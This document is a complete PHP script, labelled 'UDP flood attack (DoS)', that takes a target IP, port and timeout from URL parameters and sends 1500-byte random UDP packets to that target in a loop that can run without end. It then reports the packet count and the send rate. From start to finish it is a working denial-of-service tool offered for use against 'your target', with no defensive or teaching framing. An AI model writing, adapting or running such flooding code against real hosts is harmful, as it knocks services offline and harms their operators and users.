<?php

/*
 * @Alpha 1.0
 * UDP flood attack (DoS)
 * 
 * */

 /* 
 * Start timer
 */
 $s = microtime(1);
 
 /* 
 * run script forever & in background 
 */
 set_time_limit(0);
 ignore_user_abort(false);

/* 
 * Check if all args are inserted
 */
 $error = '';
 if(isset($_GET['ip']) && false === filter_var($_GET['ip'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) 
                                $error .= '[IPV4] is wrong, the ip address of your target<br>';
 if(!isset($_GET['ip']))        $error .= '[IPV4] is missing, the ip address of your target<br>';
 if(!isset($_GET['port']))      $error .= '[PORT] is missing, the port may be closed<br>';
 if(!isset($_GET['timeout']))   $error .= '[TIMEOUT] is missing, set it to 0 if you want to loop infinite<br>';
 if(!empty($error)) exit($error);

/* 
 * Fetch target informations
 */
 $ip      = (string)gethostbyname($_GET['ip']);
 $port    = (int)$_GET['port'];
 $timeout = (int)$_GET['timeout'];

/* 
 * Setting timeout
 */
 if($timeout !== -1) $max_time = time()+$timeout;

/* 
 * Create sockets
 */
 $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

/* 
 * Unable to create sockets
 */
if($socket<0) die('Unable to create sockets.');

/* 
 * Generate random data with 1500 bytes length (limit) 
 */
$data = '';
$i    = 1500;
do $data.= chr(rand(0,255)); while (--$i);

/* 
 * Infinite loop flooding
 */
$pack_sended = 0;
echo '<div style="display:none">';
do{
    ++$pack_sended;
	if($timeout !== -1 && time() > $max_time) break;
    if(!socket_sendto($socket,$data,strlen($data),0,$ip,$port)) die('Unable to send sockets.'); 
    echo '.';
} while(1);

/* Print result
 */
echo '</div>
<pre style="color:green"> /* 
 *  {-} <strong><u>Flooding Target</u></strong>:     <strong>'.$ip.':'.$port.'</strong>
 *  {-} <strong><u>Packets Transmitted</u></strong>: <strong>'.$pack_sended.'</strong>
 *  {-} <strong><u>Speed Send Average</u></strong>:  <strong>'.round($pack_sended/(microtime(1)-$s)).' packets/sec</strong>
 */
</pre>';
?>